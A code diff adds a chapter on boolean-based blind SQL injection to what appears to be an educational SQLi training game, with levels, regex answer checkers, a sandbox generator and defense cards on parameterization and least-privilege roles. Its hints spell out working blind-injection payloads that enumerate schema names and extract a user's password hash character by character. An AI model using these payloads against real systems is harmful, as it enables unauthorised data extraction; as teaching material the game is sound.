@@ -1184,7 +1184,193 @@ GRANT SELECT (id, username) ON users TO app_reader;  -- no pw_hash
       };
     },
   },
-  // Chapters 4 – 8 + NoSQL bonus still to author — see DESIGN.md §11 for continuation notes.
+  4: {
+    id: 4, name: 'Boolean-Based Blind', class: 'blind-bool',
+    intro: 'The page says nothing — but "something" vs "nothing" is still a bit of data.',
+    levels: {
+      1: {
+        id: '4.1', name: 'The Coin Flip',
+        endpoint: 'GET /profile?id={n}',
+        query: 'SELECT name FROM users WHERE id={u}',
+        field: 'id',
+        goal: 'Confirm the endpoint is boolean-blind: true returns a profile, false returns an empty page.',
+        reconNotes: [
+          'No errors, no data echo. Page either shows a profile or a blank shell.',
+          'Append AND 1=1 vs AND 1=2 to probe the truth channel.',
+          'Different response sizes = oracle.',
+        ],
+        hints: [
+          'Try  1 AND 1=1  — profile appears.',
+          'Try  1 AND 1=2  — profile vanishes.',
+          'That difference is your oracle. Payload for this level: 1 AND 1=1',
+        ],
+        check(p) {
+          const hasProbe = /\b1\s*=\s*1\b/.test(p) || /\btrue\b/i.test(p);
+          const numericCtx = /^\s*\d+\s+and\s+/i.test(p);
+          return (hasProbe && numericCtx)
+            ? { ok: true, narrate: 'Profile renders. Flipping to 1=2 erases it. Oracle confirmed.' }
+            : { ok: false, narrate: 'No signal. Shape your probe around a numeric AND.' };
+        },
+        unlockTokens: ['AND', '1=1', '1=2'],
+        defense: {
+          title: 'Blind Still Means Injectable',
+          body: 'Lack of error echo is not a defense. If input touches the WHERE, an oracle exists.',
+          code: `db.prepare("SELECT name FROM users WHERE id = ?").get(id);`,
+          tip: 'Parameterize. Blind injection is slow to exploit but always possible without it.',
+        },
+      },
+      2: {
+        id: '4.2', name: 'The Single Letter',
+        endpoint: 'GET /profile?id={n}',
+        query: 'SELECT name FROM users WHERE id={u}',
+        field: 'id',
+        goal: 'Ask the oracle: "is the first letter of the DB name \\"d\\"?" — get a yes.',
+        reconNotes: [
+          'database() returns the DB name. Use SUBSTRING to pick char 1.',
+          'ASCII() converts it to a number comparable with =.',
+          'If first char is \'d\' (ASCII 100), the oracle says true.',
+        ],
+        hints: [
+          'SUBSTRING(database(),1,1) grabs character 1.',
+          'ASCII(...) = 100  tests for \'d\'.',
+          "Payload:  1 AND ASCII(SUBSTRING(database(),1,1))=100",
+        ],
+        check(p) {
+          const ok = /ascii\s*\(\s*substring\s*\(.*database\s*\(\s*\)\s*,\s*1\s*,\s*1\s*\)\s*\)\s*=\s*100/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Oracle: TRUE. First letter of the DB name is "d".' }
+            : { ok: false, narrate: 'Oracle silent. Shape the probe to ASK about character 1.' };
+        },
+        unlockTokens: ['SUBSTRING(', 'ASCII(', 'database()'],
+        defense: {
+          title: 'Character-Level Oracles Still Need Injection',
+          body: 'The fix is the same as every other SQLi class — parameters.',
+          code: `// No matter how clever the oracle, parameters deny it a channel.`,
+          tip: 'Oracles compound: one bit per request × 8 bits per char × N chars. Feasible with automation.',
+        },
+      },
+      3: {
+        id: '4.3', name: 'The Binary Search',
+        endpoint: 'GET /profile?id={n}',
+        query: 'SELECT name FROM users WHERE id={u}',
+        field: 'id',
+        goal: 'Use a greater-than comparison to halve the search space per request.',
+        reconNotes: [
+          'Equality (=) needs up to 128 queries per char. Inequality (>) needs only ~7 (log₂ 128).',
+          'Typical probe: ASCII(SUBSTRING(...,1,1)) > 109   → is char > \'m\'?',
+        ],
+        hints: [
+          'Use > instead of = for binary search.',
+          'Payload:  1 AND ASCII(SUBSTRING(database(),1,1)) > 109',
+          'True → char is in the upper half of ASCII.',
+        ],
+        check(p) {
+          const ok = /ascii\s*\(\s*substring\s*\(.*,\s*1\s*,\s*1\s*\)\s*\)\s*>\s*\d+/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Oracle: TRUE ( > 109 ). You can bisect your way to any character.' }
+            : { ok: false, narrate: 'The probe is not a range comparison.' };
+        },
+        unlockTokens: ['>', 'BETWEEN'],
+        defense: {
+          title: 'Rate-Limit + Anomaly Detection (Mitigation, Not Fix)',
+          body: 'While parameters are the real fix, detecting thousands of nearly-identical requests is a useful defense layer.',
+          code:
+`// WAF rule: >50 requests/sec with ASCII(SUBSTRING pattern → block + alert.
+// Still: parameterize. Don\'t rely on detection alone.`,
+          tip: 'Detection buys time; parameters remove the vulnerability.',
+        },
+      },
+      4: {
+        id: '4.4', name: 'The Table Name',
+        endpoint: 'GET /profile?id={n}',
+        query: 'SELECT name FROM users WHERE id={u}',
+        field: 'id',
+        goal: 'Infer the name of the first user table from INFORMATION_SCHEMA, character by character.',
+        reconNotes: [
+          '(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)',
+          'Wrap that in SUBSTRING + ASCII and probe per character.',
+        ],
+        hints: [
+          'Subquery the table name, then bisect each character.',
+          "Payload skeleton:  1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)) > 100",
+        ],
+        check(p) {
+          const hasSub = /substring\s*\(\s*\(\s*select\s+table_name/i.test(p);
+          const hasAscii = /ascii\s*\(/i.test(p);
+          const hasCmp = /(>|<|=)\s*\d+/.test(p);
+          return (hasSub && hasAscii && hasCmp)
+            ? { ok: true, narrate: 'First table name, char 1: "u". Next: "s". Then "e", "r", "s". → users.' }
+            : { ok: false, narrate: 'Probe not shaped correctly.' };
+        },
+        unlockTokens: ['(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)'],
+        defense: {
+          title: 'Information Disclosure via Inference',
+          body: 'INFORMATION_SCHEMA is enumerable under any SQLi. Least-privilege users help somewhat, but parameterization is the only real answer.',
+          code: `// Parameterize. Always.`,
+          tip: 'An oracle + patience = full schema disclosure.',
+        },
+      },
+      5: {
+        id: '4.5', name: 'The Hash, One Bit at a Time',
+        endpoint: 'GET /profile?id={n}',
+        query: 'SELECT name FROM users WHERE id={u}',
+        field: 'id',
+        goal: "Exfiltrate captain's pw_hash one character at a time via boolean probes.",
+        reconNotes: [
+          'Target: (SELECT pw_hash FROM users WHERE username=\'captain\').',
+          'Walk SUBSTRING index 1..N with binary search on each.',
+        ],
+        hints: [
+          'Same probe shape as before, with pw_hash as the target.',
+          "Payload:  1 AND ASCII(SUBSTRING((SELECT pw_hash FROM users WHERE username='captain'),1,1)) > 100",
+        ],
+        check(p) {
+          const target = /pw_hash\s+from\s+users\s+where\s+username\s*=\s*['"]captain['"]/i.test(p);
+          const probe  = /ascii\s*\(\s*substring\s*\(.*,\s*\d+\s*,\s*1\s*\)\s*\)\s*(>|<|=)\s*\d+/i.test(p);
+          return (target && probe)
+            ? { ok: true, narrate: 'Bit by bit, the hash drips out: "$argon2id$v=19$…". Offline cracking begins.' }
+            : { ok: false, narrate: 'Probe or target missing.' };
+        },
+        unlockTokens: ["SUBSTRING((SELECT pw_hash FROM users WHERE username='captain'),1,1)"],
+        defense: {
+          title: 'Least-Privilege DB Role',
+          body: 'If the app DB user cannot SELECT pw_hash, no oracle can find it. Parameterize + partition reads.',
+          code:
+`CREATE ROLE app_reader;
+GRANT SELECT (id, username, name) ON users TO app_reader;  -- pw_hash excluded
+-- Login service uses a separate role with verify-only procedure.`,
+          tip: 'A well-scoped DB role turns data theft into "returns nothing" even under SQLi.',
+        },
+      },
+    },
+    sandbox(seed) {
+      const rand = mulberry32(seed);
+      const targets = ['database()', 'current_user', 'version()', '(SELECT username FROM users LIMIT 1)'];
+      const target = targets[Math.floor(rand() * targets.length)];
+      return {
+        id: `4.S-${seed}`, name: `Sandbox: probe ${target.slice(0, 18)}${target.length > 18 ? '…' : ''}`,
+        endpoint: 'GET /x?id={n}', query: 'SELECT name FROM t WHERE id={u}', field: 'id',
+        goal: `Build a boolean probe that asks about the first character of ${target}.`,
+        reconNotes: [
+          `Target expression: ${target}`,
+          'Use SUBSTRING(...,1,1) + ASCII(...) + comparator.',
+          'Sandbox: cheatsheet definitions are visible.',
+        ],
+        hints: [],
+        check(p) {
+          const shaped = /ascii\s*\(\s*substring\s*\(.*,\s*1\s*,\s*1\s*\)\s*\)\s*(>|<|=)\s*\d+/i.test(p);
+          const hit    = p.toLowerCase().includes(target.toLowerCase().split(' ')[0].slice(0, 6));
+          return (shaped && hit)
+            ? { ok: true, narrate: 'Oracle responds. Proceed bit-wise.' }
+            : { ok: false, narrate: 'Probe not shaped right.' };
+        },
+        unlockTokens: [],
+        defense: { title: 'Sandbox Cleared', body: 'Same defenses.', code: '// See cards.', tip: 'Re-roll.' },
+        sandbox: true,
+      };
+    },
+  },
+  // Chapters 5 – 8 + NoSQL bonus still to author — see DESIGN.md §11 for continuation notes.
 };
 
 const KNOWN_TOKENS = [
